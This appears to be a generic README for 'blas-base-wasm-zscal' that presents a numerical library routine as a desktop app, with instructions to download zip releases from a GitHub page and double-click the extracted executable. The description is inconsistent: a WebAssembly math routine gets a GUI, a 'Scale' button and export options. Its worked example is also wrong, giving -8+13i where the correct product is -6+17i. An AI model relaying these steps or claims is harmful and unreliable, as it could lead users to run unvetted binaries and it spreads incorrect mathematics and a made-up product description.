[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/ddeda/blas-base-wasm-zscal/releases)

## üöÄ Getting Started

Welcome to the blas-base-wasm-zscal project! This application allows you to scale a double-precision complex floating-point vector by a double-precision complex floating-point constant. With just a few simple steps, you can harness the power of advanced mathematics without needing programming skills.

## üíª System Requirements

Before you start, ensure your system meets the following requirements:

- Operating System: Windows, macOS, or Linux
- JavaScript Runtime: Node.js (version 12 or later)
- Memory: At least 4 GB RAM
- Processor: Any modern 64-bit processor

## üì¶ Download & Install

To download the application, visit this page to download: [Release Page](https://github.com/ddeda/blas-base-wasm-zscal/releases).

### Step-by-Step Installation Guide

1. **Visit the Release Page**

   Open your web browser and go to the following link: [Release Page](https://github.com/ddeda/blas-base-wasm-zscal/releases).

2. **Choose the Latest Version**

   On the release page, look for the latest version. This will usually be at the top of the list.

3. **Download the Package**

   Click on the appropriate package for your operating system to start the download. You should see a download button or link. It may look like this: 
   - `blas-base-wasm-zscal-windows.zip` for Windows
   - `blas-base-wasm-zscal-macos.zip` for macOS
   - `blas-base-wasm-zscal-linux.zip` for Linux

4. **Extract the Files**

   Once the download is complete, locate the downloaded file on your computer. Right-click the file and select "Extract All" or use any extraction software you prefer. This step will give you access to the application files.

5. **Open the Application**

   Navigate to the folder where you extracted the files. Find the application file, which will be named `blas-base-wasm-zscal`. Double-click this file to launch the application. 

6. **Follow In-App Instructions**

   After launching, you will see a user-friendly interface. Follow the on-screen instructions to input your double-precision complex vector and constant. 

Be sure to have the appropriate values for your calculations ready. If you're unsure how to format these numbers, feel free to refer to the helpful examples provided in the app.

## üìä How to Use

### Input Your Data

1. **Complex Vector:** Enter your vector as a comma-separated list. For example, `1+2i, 3+4i, 5+6i`.
2. **Scaling Constant:** Enter the complex scaling constant in the form of `a+bi` (e.g., `2+3i`).

### Run the Calculation

After entering your data, click the "Scale" button. The application will process the inputs and display the scaled complex vector.

### Output Information

The output will show the scaled vector in the same format you used for input. You can then copy or use this data for your needs.

## üìö Example Usage

Suppose you want to scale the vector `1+2i, 3+4i` by the constant `2+3i`. 

1. Input: 
   - **Complex Vector:** `1+2i, 3+4i`
   - **Scaling Constant:** `2+3i`
   
2. Click "Scale."
3. The output might be something like: `(-4+7i), (-8+13i)`

## ‚öôÔ∏è Advanced Configuration (Optional)

If you're comfortable with additional adjustments, you can customize some settings within the app:

- **Precision Settings:** Change the decimal precision of results.
- **Data Export Options:** Save the results in various formats (e.g., CSV).

These options may require some familiarity with the application, but they can enhance your experience.

## ‚ö†Ô∏è Troubleshooting

If you encounter issues while running the application, consider the following steps:

- Ensure you have the correct version of Node.js installed.
- Make sure all required files are extracted properly.
- Verify that you are using the correct format for complex numbers.
- If the application crashes, check your system resources to ensure you are not running low on memory.
